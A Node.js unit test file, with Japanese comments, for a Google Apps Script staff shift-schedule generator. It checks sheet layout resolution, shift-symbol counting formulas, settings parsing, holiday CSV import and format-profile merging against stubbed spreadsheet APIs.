/**
 * tests/pure.test.js — GAS に載せずに検証できる部分のテスト
 *
 *   node tests/pure.test.js
 *
 * .gs をすべて連結して eval し、GAS のグローバル（SpreadsheetApp など）は
 * 最小限のスタブで代用する。純粋関数だけを対象にするので、
 * 実行にスプレッドシートは要らない。
 *
 * 【一番大事なテスト】
 *   SheetBuilder.planSheetPositions_() が決めた行位置を、
 *   Layout.resolveLayout() が同じ値として読み戻せるか。
 *   ここが合わないと、生成したシートは自動作成に使えない。
 *
 * 実名は一切使わない（Tier 3）。氏名は "A" "B" … で代用する。
 */

'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const assert = require('assert');

const ROOT = path.join(__dirname, '..');

// ---- GAS グローバルの最小スタブ ---------------------------------------
const sandbox = {
  console: console,
  SpreadsheetApp: {
    getActive: function () { throw new Error('stub: SpreadsheetApp は純粋関数から呼ばれてはいけない'); },
    getActiveSheet: function () { throw new Error('stub: SpreadsheetApp'); },
    getUi: function () { throw new Error('stub: SpreadsheetApp'); },
    flush: function () {},
    BorderStyle: { SOLID: 'SOLID' },
  },
  Utilities: { formatDate: function () { return 'stub'; } },
  PropertiesService: {
    getScriptProperties: function () { return { getProperty: function () { return null; } }; },
    getDocumentProperties: function () { return { getProperty: function () { return null; } }; },
  },
  Session: { getEffectiveUser: function () { return { getEmail: function () { return ''; } }; } },
  MailApp: { sendEmail: function () {} },
  UrlFetchApp: {},
  DriveApp: {},
  ScriptApp: {},
  HtmlService: {},
  LockService: {
    getScriptLock: function () {
      return { tryLock: function () { return true; }, releaseLock: function () {} };
    },
  },
};
vm.createContext(sandbox);

const sources = fs.readdirSync(ROOT)
  .filter(function (f) { return f.endsWith('.gs'); })
  .sort();
sources.forEach(function (f) {
  vm.runInContext(fs.readFileSync(path.join(ROOT, f), 'utf8'), sandbox, { filename: f });
});

// トップレベルの const は vm のグローバル「レキシカル」スコープに入るので、
// sandbox オブジェクトのプロパティにはならない。テストから読めるよう取り出す。
// （function 宣言は自動で sandbox に載るので、この扱いが要るのは const だけ）
Object.assign(sandbox, vm.runInContext(
  '({ CONFIG, LABEL, NAMED_RANGE, LAYOUT, SYM, KIND, RULE, CFG_MEMBER, CFG_SETTING,'
  + ' SETTING_DEFAULT, HOLIDAY_SHEET, CHANGELOG_SHEET, ENGINE_LIMIT, DOC_BUSY_N,'
  + ' NON_NAME_LABELS, MASK_NAMES, SHEET_BUILD, SETUP_KNOWN_HEADS,'
  + ' WORK_SYMS, WORK_SYM_PREFIX_MATCH,'
  + ' SCHEMA, FORMAT_PROFILE, FORMAT_DEFAULT, DOCTOR_MASTER, PATTERN_MASTER,'
  + ' NOTE_MASTER,'
  + ' ST_SKIP, ST_NONE, ST_WORK, ST_OFF, ST_FWORK, ST_FOFF,'
  + ' ROLE, ROLE_RANK, FORMULA_LEADS, FORMULA_LEAD_CTRL, CELL_MAX_LEN,'
  + ' WEBAPP_VIEW_FILE, STORE_DB_FILE, STORE_CHUNK })', sandbox));

// ---- テストランナー ----------------------------------------------------
let passed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    passed++;
  } catch (e) {
    failures.push({ name: name, message: e.message });
  }
}

// ---- 位置の整合（仕様書 §3.2 の解決規則） -----------------------------

test('planSheetPositions_ が Layout の相対規則を満たす', function () {
  [1, 5, 16, 40].forEach(function (staffRows) {
    const p = sandbox.planSheetPositions_(staffRows);
    assert.strictEqual(p.headerRow, p.dateRow - 1, 'headerRow = dateRow - 1');
    assert.strictEqual(p.weekRow, p.dateRow + 1, 'weekRow = dateRow + 1');
    assert.strictEqual(p.doctorBottom - p.doctorTop + 1, sandbox.LAYOUT.DOC_BLOCK_ROWS,
      '医師名欄は DOC_BLOCK_ROWS 行');
    assert.strictEqual(p.gridTop, p.repeatDateRow + sandbox.LAYOUT.DATE_REPEAT_GAP,
      'gridTop = repeatDateRow + DATE_REPEAT_GAP');
    assert.strictEqual(p.gridBottom, p.docRow - sandbox.LAYOUT.DOC_GAP,
      'gridBottom = docRow - DOC_GAP');
    assert.strictEqual(p.docRow, p.noteRow + sandbox.LAYOUT.NOTE_TO_DOC,
      'docRow = noteRow + NOTE_TO_DOC');
    assert.strictEqual(p.gridBottom, p.noteRow - sandbox.LAYOUT.NOTE_GAP,
      'gridBottom = noteRow - NOTE_GAP');
    assert.strictEqual(p.gridBottom - p.gridTop + 1, staffRows, 'スタッフ行数が一致');
  });
});

/**
 * planSheetPositions_ の結果どおりに値が入った偽シートを作り、
 * resolveLayout() が同じ位置を読み戻せるかを見る。
 */
function makeFakeSheet(p) {
  // Date は vm の中で作る。realm が違うと resolveLayout の
  // `value instanceof Date` が false になり、日付行を見つけられない。
  const vmDate = vm.runInContext('new Date(2026, 8, 1)', sandbox);
  const maxRows = p.shortageRow + 5;
  const bFormulas = [];
  const bValues = [];
  const aValues = [];
  for (let r = 1; r <= maxRows; r++) {
    const isDateRow = (r === p.dateRow || r === p.repeatDateRow);
    bFormulas.push([isDateRow ? '=A1' : '']);
    bValues.push([isDateRow ? vmDate : '']);

    let a = '';
    if (r === p.noteRow) a = sandbox.LABEL.NOTE;
    else if (r === p.docRow) a = sandbox.SHEET_BUILD.ROW_HEAD_DOC;
    else if (r === p.pharmRow) a = sandbox.SHEET_BUILD.ROW_HEAD_PHARM;
    else if (r === p.shortageRow) a = sandbox.SHEET_BUILD.ROW_HEAD_SHORTAGE;
    else if (r >= p.gridTop && r <= p.gridBottom) a = 'ｽﾀｯﾌ' + (r - p.gridTop + 1);
    aValues.push([a]);
  }

  function slice(src, startRow, numRows) {
    return src.slice(startRow - 1, startRow - 1 + numRows).map(function (row) { return row.slice(); });
  }

  return {
    getName: function () { return 'fake'; },
    getMaxRows: function () { return maxRows; },
    getSheetId: function () { return 1; },
    getRange: function (row, col, numRows) {
      if (col === sandbox.LAYOUT.COL_FIRST) {
        return {
          getFormulas: function () { return slice(bFormulas, row, numRows); },
          getValues: function () { return slice(bValues, row, numRows); },
        };
      }
      if (col === 1) {
        return { getValues: function () { return slice(aValues, row, numRows); } };
      }
      throw new Error('fake sheet: 想定外の列 ' + col);
    },
  };
}

test('日付行は数式が無くても見つかる（Excel からの取り込み対策）', function () {
  const vmDate = vm.runInContext('new Date(2026, 8, 1)', sandbox);
  // 数式が値に変わったシートを再現する
  const values = [[''], [vmDate], [''], [''], [vmDate], ['']];
  assert.deepStrictEqual(Array.from(sandbox.findDateRows_(values)), [2, 5]);
  assert.deepStrictEqual(Array.from(sandbox.findDateRows_([[''], ['']])), []);
});

test('日付行が足りないとき、何が起きているか言い当てる', function () {
  // 「1」「2」が数値になっているシート
  const msg = sandbox.describeDateRowFailure_([], [[''], [1], [2], [3]]);
  assert.ok(msg.indexOf('数値') >= 0, '数値だと言い当てる');
  assert.ok(msg.indexOf('レイアウト診断') >= 0, '次の一手を示す');

  const vmDate = vm.runInContext('new Date(2026, 8, 1)', sandbox);
  const one = sandbox.describeDateRowFailure_([2], [[''], [vmDate]]);
  assert.ok(one.indexOf('1つ') >= 0 && one.indexOf('再掲') >= 0, '再掲が無いと言う');
});

test('生成した配置を resolveLayout が同じ位置として読み戻す', function () {
  [1, 5, 16, 40].forEach(function (staffRows) {
    const p = sandbox.planSheetPositions_(staffRows);
    const got = sandbox.resolveLayout(makeFakeSheet(p));
    ['dateRow', 'repeatDateRow', 'headerRow', 'weekRow', 'doctorTop', 'doctorBottom',
      'noteRow', 'docRow', 'pharmRow', 'shortageRow', 'gridTop', 'gridBottom',
      'firstCol', 'lastCol'].forEach(function (key) {
      assert.strictEqual(got[key], p[key],
        `staffRows=${staffRows} の ${key}: 生成 ${p[key]} / 解決 ${got[key]}`);
    });
  });
});

// ---- 列文字 -----------------------------------------------------------

test('toColumnLetter が列番号を列文字に直す', function () {
  const cases = [[1, 'A'], [2, 'B'], [26, 'Z'], [27, 'AA'], [32, 'AF'],
                 [33, 'AG'], [34, 'AH'], [39, 'AM'], [40, 'AN']];
  cases.forEach(function (c) {
    assert.strictEqual(sandbox.toColumnLetter(c[0]), c[1], `${c[0]} → ${c[1]}`);
  });
});

test('Config の列番号が仕様書 §3.1 の列と対応する', function () {
  assert.strictEqual(sandbox.toColumnLetter(sandbox.LAYOUT.COL_FIRST), 'B');
  assert.strictEqual(sandbox.toColumnLetter(sandbox.LAYOUT.COL_LAST), 'AF');
  assert.strictEqual(sandbox.toColumnLetter(sandbox.LAYOUT.COL_MONTH), 'AG');
  assert.strictEqual(sandbox.toColumnLetter(sandbox.LAYOUT.COL_AGG_FIRST), 'AH');
  assert.strictEqual(sandbox.toColumnLetter(sandbox.LAYOUT.COL_AGG_LAST), 'AM');
  assert.strictEqual(sandbox.toColumnLetter(sandbox.LAYOUT.COL_KIND_WORK), 'AN');
  assert.strictEqual(sandbox.LAYOUT.COL_LAST - sandbox.LAYOUT.COL_FIRST + 1, 31, '日付列は31日分');
});

// ---- isPaidOff は部分一致（仕様書 §10 のチェックリスト） --------------

test('isPaidOff は部分一致（「有休」で「有休※」も拾う）', function () {
  const def = sandbox.SETTING_DEFAULT.paidSyms.value;   // '有休,夏休'
  assert.strictEqual(sandbox.isPaidOff('有休', def), true);
  assert.strictEqual(sandbox.isPaidOff('有休※', def), true, '部分一致でなければならない');
  assert.strictEqual(sandbox.isPaidOff('夏休', def), true);
  assert.strictEqual(sandbox.isPaidOff('公休', def), false);
  assert.strictEqual(sandbox.isPaidOff('希休', def), false);
  assert.strictEqual(sandbox.isPaidOff('', def), false);
  assert.strictEqual(sandbox.isPaidOff('有休', '公休'), false, 'L11 を変えたら結果も変わる');
});

test('集計列 AH/AI の振り分けが仕様書 §5.4 の例と一致する', function () {
  const def = sandbox.SETTING_DEFAULT.paidSyms.value;
  // vm 側で作られた配列なので Array.from で Node 側の配列に移してから比べる
  assert.deepStrictEqual(Array.from(sandbox.splitOffSymbolsByQuota_(def, true)),
    ['公休', '希休'], 'AH（ノルマ対象）');
  assert.deepStrictEqual(Array.from(sandbox.splitOffSymbolsByQuota_(def, false)),
    ['夏休', '有休', '有休※'], 'AI（ノルマ外）');
});

// ---- 数式の組み立て ---------------------------------------------------

test('薬剤師出勤数の数式が MATCH に配列を渡さない（§5.3）', function () {
  const f = sandbox.buildPharmCountFormula_('B', 11, 26);
  assert.ok(f.indexOf('MATCH') < 0, 'MATCH を使わず作業列を参照すること');
  assert.ok(f.indexOf('$AN$11:$AN$26') >= 0, '区分の作業列 AN を参照する');
  assert.ok(f.indexOf('"薬剤師"') >= 0);
  Array.from(sandbox.WORK_SYMS).forEach(function (sym) {
    assert.ok(f.indexOf(`"${sym}*"`) >= 0 || f.indexOf(`"${sym}"`) >= 0,
      `出勤記号 ${sym} を数える`);
  });
});

test('出勤記号の集計が派遣行の「▲＋氏名」を拾う（先頭一致）', function () {
  assert.strictEqual(sandbox.WORK_SYM_PREFIX_MATCH, true,
    '既定は先頭一致（派遣行を頭数に入れる運用の前提）');

  const pharm = sandbox.buildPharmCountFormula_('B', 11, 26);
  assert.ok(pharm.indexOf('"▲*"') >= 0, '薬剤師出勤数がワイルドカードで数える');
  assert.ok(pharm.indexOf('COUNTIFS(') >= 0, 'COUNTIFS を使う');

  const late = sandbox.buildCountifSumFormula_(11, ['▲'], true);
  assert.strictEqual(late, '=COUNTIF(B11:AF11,"▲*")', '集計列 AK も先頭一致');

  // 休み記号は完全一致のまま（緩めると公休ノルマの数え方が isPaidOff とずれる）
  const off = sandbox.buildCountifSumFormula_(11, ['公休']);
  assert.strictEqual(off, '=COUNTIF(B11:AF11,"公休")', '休み記号は完全一致');
});

test('matchWorkSym が記号を正規化し、複合テキストも拾う', function () {
  assert.strictEqual(sandbox.matchWorkSym('○'), '○');
  assert.strictEqual(sandbox.matchWorkSym('◯'), '○', '別字体は ○ に正規化');
  assert.strictEqual(sandbox.matchWorkSym('▲'), '▲');
  assert.strictEqual(sandbox.matchWorkSym('●'), '●');

  // 実物の派遣行にある書き方（氏名は伏せて記号だけ再現する）
  assert.strictEqual(sandbox.matchWorkSym('▲＊＊＊＊'), '▲', '記号＋氏名を出勤とみなす');
  assert.strictEqual(sandbox.matchWorkSym('●＊＊'), '●');

  // 休みと空欄は出勤ではない
  ['公休', '希休', '夏休', '有休', '有休※', '', '  ', '↑15-20'].forEach(function (v) {
    assert.strictEqual(sandbox.matchWorkSym(v), '', `${JSON.stringify(v)} は出勤ではない`);
  });
});

test('isEarlySym と集計が同じ規則を見ている', function () {
  // Layout.isEarlySym は matchWorkSym に委譲しているので、
  // 先頭一致の設定を変えると両方が同時に変わる
  assert.strictEqual(sandbox.isEarlySym('○'), true);
  assert.strictEqual(sandbox.isEarlySym('◯'), true);
  assert.strictEqual(sandbox.isEarlySym('●'), false);
  assert.strictEqual(sandbox.isEarlySym('○＊＊'),
    sandbox.WORK_SYM_PREFIX_MATCH, '複合テキストの扱いはフラグに従う');
});

test('COUNTIF の和は記号ゼロ個のとき "=0"（"=" だけでは壊れる）', function () {
  assert.strictEqual(sandbox.buildCountifSumFormula_(11, []), '=0');
  assert.strictEqual(sandbox.buildCountifSumFormula_(11, null), '=0');
  assert.strictEqual(sandbox.buildCountifSumFormula_(11, ['公休']),
    '=COUNTIF(B11:AF11,"公休")');
  assert.strictEqual(sandbox.buildCountifSumFormula_(11, ['○', '◯']),
    '=COUNTIF(B11:AF11,"○")+COUNTIF(B11:AF11,"◯")');
});

test('5診出勤の数式が DOC_BUSY_N を使い、行の形が COUNTIFS に揃う', function () {
  const f = sandbox.buildBusyDayFormula_(11, 31);
  assert.ok(f.indexOf(`,${sandbox.DOC_BUSY_N},`) >= 0, '混雑日のしきい値を共有定数から取る');
  assert.ok(f.indexOf('$B$31:$AF$31') >= 0, '医師数行を参照する');
  assert.ok(f.indexOf('B11:AF11') >= 0, '本人の行を参照する');
  // COUNTIFS は範囲の形が揃っている必要がある。どちらも 1 行 × 31 列
  assert.ok(f.indexOf('COUNTIFS(') >= 0, 'SUMPRODUCT ではなく COUNTIFS');
});

// ---- そのほかの純粋関数 -----------------------------------------------

test('isEarlySym が ○ と ◯ の揺れを吸収する', function () {
  assert.strictEqual(sandbox.isEarlySym('○'), true);
  assert.strictEqual(sandbox.isEarlySym('◯'), true, '全角の別字体も早番');
  assert.strictEqual(sandbox.isEarlySym('●'), false);
  assert.strictEqual(sandbox.isEarlySym(''), false);
});

test('isNonName が集計行のラベルを氏名でないと判定する', function () {
  assert.strictEqual(sandbox.isNonName(''), true);
  assert.strictEqual(sandbox.isNonName('医師数(診)'), true, '前方一致で拾う');
  assert.strictEqual(sandbox.isNonName('過不足'), true);
  assert.strictEqual(sandbox.isNonName('備考'), true);
  assert.strictEqual(sandbox.isNonName('ｽﾀｯﾌ1'), false);
});

test('parseYearMonth_ が年月の書き方の揺れを受ける', function () {
  // vm の中で作られたオブジェクトは prototype が違うので deepStrictEqual は使えない
  ['2026/9', '2026-09', '2026年9月', '2026.9'].forEach(function (text) {
    const got = sandbox.parseYearMonth_(text);
    assert.ok(got, `${text} を読めること`);
    assert.strictEqual(got.year, 2026, text);
    assert.strictEqual(got.month, 9, text);
  });
  assert.strictEqual(sandbox.parseYearMonth_('2026/13'), null, '13月は受けない');
  assert.strictEqual(sandbox.parseYearMonth_('2026/0'), null, '0月は受けない');
  assert.strictEqual(sandbox.parseYearMonth_('なにか'), null);
});

test('設定の読み出しが空欄・欠落で既定値に落ちる（§3.3）', function () {
  assert.strictEqual(sandbox.readSettingNumber_([], 'maxRun'),
    sandbox.SETTING_DEFAULT.maxRun.value, '行が無ければ既定値');
  assert.strictEqual(sandbox.readSettingNumber_([['連勤の上限(日)', '']], 'maxRun'),
    sandbox.SETTING_DEFAULT.maxRun.value, '空欄なら既定値');
  assert.strictEqual(sandbox.readSettingNumber_([['連勤の上限(日)', 'あ']], 'maxRun'),
    sandbox.SETTING_DEFAULT.maxRun.value, '非数値なら既定値');
  assert.strictEqual(sandbox.readSettingNumber_([['連勤の上限(日)', 5]], 'maxRun'), 5);
  assert.strictEqual(sandbox.readSettingText_([], 'paidSyms'),
    sandbox.SETTING_DEFAULT.paidSyms.value);
  assert.strictEqual(sandbox.readSettingText_([['ノルマ外の休み記号(カンマ区切り)', '有休']],
    'paidSyms'), '有休');
});

test('早番と事務員の早番を取り違えない（ラベルの片方が他方を含む）', function () {
  // 「早番(○) 人数/日」は「事務員の早番(○) 人数/日」に丸ごと含まれる。
  // 素朴な部分一致だと、並び順しだいで静かに取り違える。
  const pairs = [
    ['事務員の早番(○) 人数/日', 9],   // わざと先に置く
    ['早番(○) 人数/日', 1],
  ];
  assert.strictEqual(sandbox.readSettingNumber_(pairs, 'earlyN'), 1,
    '薬剤師の早番は 1 でなければならない');
  assert.strictEqual(sandbox.readSettingNumber_(pairs, 'clerkEarlyN'), 9,
    '事務員の早番は 9 でなければならない');
});

// ---- Web アプリの書き込み検証（仕様書 §6.3 の移植） -------------------

/** planSheetPositions_ の位置をそのまま layout として使う */
function layoutFor(staffRows) {
  const p = sandbox.planSheetPositions_(staffRows || 16);
  p.freeRow = p.doctorBottom + 1;
  return p;
}

test('isShiftSymbol が記号と名前を区別する', function () {
  ['○', '◯', '●', '▲', '公休', '希休', '夏休', '有休', '有休※'].forEach(function (v) {
    assert.strictEqual(sandbox.isShiftSymbol(v), true, `${v} は記号`);
  });
  ['', '  ', '医師A', '銀行', '発注担当'].forEach(function (v) {
    assert.strictEqual(sandbox.isShiftSymbol(v), false, `${JSON.stringify(v)} は記号ではない`);
  });
});

// ---- 祝日 CSV の読み取り（§7.2） -------------------------------------

test('祝日の日付は書き方の揺れを受け、ありえない日は弾く', function () {
  const ok = sandbox.parseHolidayDate_('2026/1/1');
  assert.ok(ok, '2026/1/1 を読める');
  assert.strictEqual(ok.getFullYear(), 2026);
  assert.strictEqual(ok.getMonth(), 0);
  assert.strictEqual(ok.getDate(), 1);

  ['2026-01-01', '2026.1.1'].forEach(function (t) {
    assert.ok(sandbox.parseHolidayDate_(t), `${t} を読める`);
  });

  // Date は 2/30 を 3/2 へ繰り上げてしまう。黙って別の日を祝日にしないこと
  assert.strictEqual(sandbox.parseHolidayDate_('2026/2/30'), null, '存在しない日は弾く');
  assert.strictEqual(sandbox.parseHolidayDate_('2026/13/1'), null, '13月は弾く');
  assert.strictEqual(sandbox.parseHolidayDate_('国民の祝日・休日月日'), null, '見出しは弾く');
  assert.strictEqual(sandbox.parseHolidayDate_(''), null);
});

test('祝日 CSV の見出しや空行が混ざっても止まらない', function () {
  const rows = sandbox.toHolidayRows_([
    ['国民の祝日・休日月日', '国民の祝日・休日名称'],   // 見出し
    ['2026/1/1', '元日'],
    [],                                                  // 空行
    ['2026/1/12', '成人の日'],
    ['こわれた行'],
  ]);
  assert.strictEqual(rows.length, 2, '読めた行だけ残す');
  assert.strictEqual(sandbox.toDateKey(rows[0][0]), '2026-01-01');
  assert.strictEqual(rows[0][1], '元日');
  assert.strictEqual(rows[1][1], '成人の日');
  // 日付は Date 型で書く。文字列だと COUNTIF が一致せず祝日 0 件になる
  // （vm の中で作られた Date なので instanceof は realm を跨げない。振る舞いで見る）
  assert.strictEqual(typeof rows[0][0].getFullYear, 'function', '日付型で返す');
  assert.strictEqual(typeof rows[0][0], 'object');
});

test('toDateKey が 0 埋めした yyyy-MM-dd を返す', function () {
  const d = vm.runInContext('new Date(2026, 0, 5)', sandbox);
  assert.strictEqual(sandbox.toDateKey(d), '2026-01-05');
});

// ---- 生成するシートのスキーマ ----------------------------------------

test('メンバー表の見出しが CFG_MEMBER の列順と揃っている', function () {
  const heads = Array.from(sandbox.SCHEMA.CFG_MEMBER_HEADS);
  assert.strictEqual(heads.length, 9, 'A〜I の9列');
  // 列定数と見出しの並びがずれると、氏名や区分を別の列から読むことになる
  assert.strictEqual(heads[sandbox.CFG_MEMBER.COL_NAME - 1], '氏名');
  assert.strictEqual(heads[sandbox.CFG_MEMBER.COL_KIND - 1], '区分');
  assert.strictEqual(heads[sandbox.CFG_MEMBER.COL_RULE - 1], '勤務ルール');
  assert.strictEqual(heads[sandbox.CFG_MEMBER.COL_MEMO - 1], '備考');
});

test('全体設定の既定値が過不足なく並ぶ', function () {
  const keys = Object.keys(sandbox.SETTING_DEFAULT);
  keys.forEach(function (key) {
    const def = sandbox.SETTING_DEFAULT[key];
    assert.ok(def.label && String(def.label).trim() !== '', `${key} にラベルがある`);
    assert.ok(def.value !== undefined, `${key} に既定値がある`);
  });
  // 生成した行はそのまま readSettingNumber_ / readSettingText_ で読み戻せること
  const pairs = keys.map(function (key) {
    return [sandbox.SETTING_DEFAULT[key].label, sandbox.SETTING_DEFAULT[key].value];
  });
  assert.strictEqual(sandbox.readSettingNumber_(pairs, 'maxRun'),
    sandbox.SETTING_DEFAULT.maxRun.value);
  assert.strictEqual(sandbox.readSettingNumber_(pairs, 'clerkEarlyN'),
    sandbox.SETTING_DEFAULT.clerkEarlyN.value, '事務員の早番を取り違えない');
  assert.strictEqual(sandbox.readSettingNumber_(pairs, 'earlyN'),
    sandbox.SETTING_DEFAULT.earlyN.value, '薬剤師の早番を取り違えない');
  assert.strictEqual(sandbox.readSettingText_(pairs, 'paidSyms'),
    sandbox.SETTING_DEFAULT.paidSyms.value);
});

// ---- 書式プロファイル -------------------------------------------------

test('プロファイルが無くても既定値だけで揃う', function () {
  const merged = sandbox.mergeProfileRows_(sandbox.FORMAT_DEFAULT, []);
  Array.from(sandbox.FORMAT_PROFILE.ROLES).forEach(function (role) {
    Array.from(sandbox.FORMAT_PROFILE.ATTRS).forEach(function (attr) {
      const key = `role.${role.key}.${attr.key}`;
      assert.ok(merged[key] !== undefined, `${key} に既定値がある`);
    });
  });
  ['col.name.width', 'col.day.width', 'col.agg.width',
   'day.satBg', 'day.sunBg', 'day.outMonthBg', 'day.outMonthFg',
   'format.date', 'format.month', 'label.agg'].forEach(function (key) {
    assert.ok(merged[key] !== undefined, `${key} に既定値がある`);
  });
});

test('プロファイルの値が既定値を上書きする', function () {
  const merged = sandbox.mergeProfileRows_(sandbox.FORMAT_DEFAULT, [
    ['col.day.width', 28],
    ['day.satBg', '#cfe2f3'],
    ['role.grid.bold', 'TRUE'],
  ]);
  assert.strictEqual(merged['col.day.width'], 28);
  assert.strictEqual(merged['day.satBg'], '#cfe2f3');
  assert.strictEqual(merged['role.grid.bold'], true, '文字列の TRUE を真偽値にする');
  assert.strictEqual(merged['col.agg.width'], sandbox.FORMAT_DEFAULT['col.agg.width'],
    '触っていない項目は既定値のまま');
});

test('空欄・知らないキー・壊れた値は既定値に落ちる', function () {
  const d = sandbox.FORMAT_DEFAULT;
  const merged = sandbox.mergeProfileRows_(d, [
    ['col.day.width', ''],          // 空欄 → 消しただけで既定値に戻る
    ['col.name.width', 'あいう'],    // 数値にならない
    ['role.grid.bold', 'たぶん'],    // 真偽値にならない
    ['knows.nothing', 99],          // 知らないキーは捨てる
    ['', 1],
  ]);
  assert.strictEqual(merged['col.day.width'], d['col.day.width']);
  assert.strictEqual(merged['col.name.width'], d['col.name.width']);
  assert.strictEqual(merged['role.grid.bold'], d['role.grid.bold']);
  assert.strictEqual(merged['knows.nothing'], undefined, '知らないキーは持ち込まない');
});

test('値の型が既定値と揃う（setFontSize に文字列を渡さないため）', function () {
  // シートは数値も真偽値も文字列で返しうる
  const merged = sandbox.mergeProfileRows_(sandbox.FORMAT_DEFAULT, [
    ['role.date.fontSize', '11'],
    ['role.date.bold', 'false'],
    ['role.date.bg', '#ffffff'],
  ]);
  assert.strictEqual(typeof merged['role.date.fontSize'], 'number');
  assert.strictEqual(merged['role.date.fontSize'], 11);
  assert.strictEqual(typeof merged['role.date.bold'], 'boolean');
  assert.strictEqual(merged['role.date.bold'], false);
  assert.strictEqual(typeof merged['role.date.bg'], 'string');
});

test('環境設定（JSON）が壊れていても既定値で動く', function () {
  const d = sandbox.FORMAT_DEFAULT;

  // 書式が読めないせいでシフト表そのものが作れなくなるのは割に合わない。
  // どの壊れ方でも既定値へ落として、生成できる側に倒す
  ['', null, undefined, '{壊れた', '[]', '123', '"文字列"', 'null'].forEach(function (json) {
    const p = sandbox.parseProfileJson_(json, d);
    assert.strictEqual(p['col.day.width'], d['col.day.width'],
      `${JSON.stringify(json)} でも既定値`);
  });
});

test('環境設定の JSON が既定値を上書きする', function () {
  const d = sandbox.FORMAT_DEFAULT;
  const p = sandbox.parseProfileJson_(JSON.stringify({
    'col.day.width': 26,
    'role.grid.fontSize': 9,
    'day.satBg': '#cfe2f3',
    'label.doc': '医師数',
    'まったく知らないキー': 'x',
  }), d);

  assert.strictEqual(p['col.day.width'], 26);
  assert.strictEqual(p['role.grid.fontSize'], 9);
  assert.strictEqual(p['day.satBg'], '#cfe2f3');
  assert.strictEqual(p['label.doc'], '医師数');
  assert.strictEqual(p['まったく知らないキー'], undefined, '知らないキーは持ち込まない');
  assert.strictEqual(p['col.agg.width'], d['col.agg.width'], '触っていない項目は既定値');
});

test('シートを直して反映する経路と、JSON から読む経路が同じ結果になる', function () {
  const d = sandbox.FORMAT_DEFAULT;
  // 控えシートを手で直した想定
  const fromSheet = sandbox.mergeProfileRows_(d, [
    ['col.day.width', '26'],
    ['role.grid.bold', 'TRUE'],
  ]);
  // それを保存して読み直した想定
  const fromJson = sandbox.parseProfileJson_(JSON.stringify(fromSheet), d);

  Object.keys(d).forEach(function (key) {
    assert.strictEqual(fromJson[key], fromSheet[key], `${key} が往復で変わらない`);
  });
});

test('条件付き書式で色分けしているシートから色を拾える', function () {
  // getBackgrounds() は条件付き書式の色を返さない。ルール側から拾う必要がある
  const rules = [
    { index: 1, kind: 'CUSTOM_FORMULA', bg: '#f2f2f2', fontColor: '#999999',
      formula: '=MONTH(B$2)<>MONTH($A$1)', ranges: 'B2:AF33' },
    { index: 2, kind: 'CUSTOM_FORMULA', bg: '#f4cccc', fontColor: '',
      formula: '=WEEKDAY(B$2)=1', ranges: 'B2:AF3' },
    { index: 3, kind: 'CUSTOM_FORMULA', bg: '#cfe2f3', fontColor: '',
      formula: '=WEEKDAY(B$2)=7', ranges: 'B2:AF3' },
  ];
  const got = sandbox.deriveDayColorsFromRules_(rules);
  assert.strictEqual(got['day.satBg'], '#cfe2f3');
  assert.strictEqual(got['day.sunBg'], '#f4cccc');
  assert.strictEqual(got['day.outMonthBg'], '#f2f2f2');
  assert.strictEqual(got['day.outMonthFg'], '#999999');
});

test('拾えない条件付き書式があっても壊れない', function () {
  const got = sandbox.deriveDayColorsFromRules_([
    { index: 1, kind: 'グラデーション', bg: '', fontColor: '', formula: '', ranges: '' },
    { index: 2, kind: 'TEXT_EQUAL_TO', bg: '#00ff00', fontColor: '',
      formula: '担当', ranges: 'B9:AF9' },      // 担当者の色分け。曜日とは無関係
    { index: 3, kind: 'CUSTOM_FORMULA', bg: '', fontColor: '',
      formula: '=WEEKDAY(B$2)=7', ranges: '' },  // 色が無いルールは使わない
  ]);
  // vm の中で作られたオブジェクトなので、キーの一覧で比べる
  assert.deepStrictEqual(Object.keys(got).sort(), [], '当たらなければ何も返さない');
  assert.deepStrictEqual(Object.keys(sandbox.deriveDayColorsFromRules_([])), []);
  assert.deepStrictEqual(Object.keys(sandbox.deriveDayColorsFromRules_(null)), []);
});

test('静的な色が塗られていれば条件付き書式より優先する', function () {
  const pick = sandbox.pickDayColor_;
  assert.strictEqual(pick('#dce6f1', '#cfe2f3', '#000000'), '#dce6f1', '静的が勝つ');

  // 白＝「塗っていない」とみなす。ここを見落とすと真っ白なプロファイルになる
  ['', '#ffffff', '#FFFFFF', 'white', '#fff', '   '].forEach(function (blank) {
    assert.strictEqual(pick(blank, '#cfe2f3', '#000000'), '#cfe2f3',
      `${JSON.stringify(blank)} は塗っていない扱い`);
  });
  assert.strictEqual(pick('', '', '#000000'), '#000000', 'どちらも無ければ既定値');
});

test('貼り付けられた JSON の読めない理由を具体的に返す', function () {
  const bad = function (text) {
    try { sandbox.parseImportedJson_(text); return null; }
    catch (e) { return e.message; }
  };
  assert.ok(bad('')?.indexOf('何も貼られていません') >= 0);
  assert.ok(bad('   ')?.indexOf('何も貼られていません') >= 0);
  assert.ok(bad('{"a":1')?.indexOf('JSON として読めません') >= 0, '途中で切れた JSON');
  assert.ok(bad('[1,2]')?.indexOf('形が違います') >= 0, '配列は受けない');
  assert.ok(bad('"文字列"')?.indexOf('形が違います') >= 0);
  assert.ok(bad('null')?.indexOf('形が違います') >= 0);

  const ok = sandbox.parseImportedJson_('{"col.day.width":30}');
  assert.strictEqual(ok['col.day.width'], 30);
});

test('横位置は Sheets が受ける語に揃える', function () {
  // Excel の「標準」は general で出てくるが setHorizontalAlignment は受けない
  assert.strictEqual(sandbox.normalizeHAlign_('general'), 'left');
  assert.strictEqual(sandbox.normalizeHAlign_(''), 'left');
  assert.strictEqual(sandbox.normalizeHAlign_(null), 'left');
  assert.strictEqual(sandbox.normalizeHAlign_('CENTER'), 'center');
  assert.strictEqual(sandbox.normalizeHAlign_('right'), 'right');
});

test('和暦の見出しは数式で組む（表示形式では作れないため）', function () {
  const tpl = sandbox.FORMAT_DEFAULT['title.formula'];
  const f = sandbox.buildTitleFormula_(tpl, 'A1');

  assert.ok(f.indexOf('{month}') < 0, 'プレースホルダが残らない');
  assert.ok(f.indexOf('A1') >= 0, '年月セルを参照する');
  // 実物は R08.08 形式。TEXT で0埋めしないと R8.8 になる
  assert.ok(f.indexOf('"00"') >= 0, '0埋めする');
  assert.strictEqual((f.match(/A1/g) || []).length, 2, '年・月の2か所に入る');

  // 空にすれば書かない（手で入力したい人のための逃げ道）
  assert.strictEqual(sandbox.buildTitleFormula_('', 'A1'), '');
  assert.strictEqual(sandbox.buildTitleFormula_('   ', 'A1'), '');
  assert.strictEqual(sandbox.buildTitleFormula_(null, 'A1'), '');
});

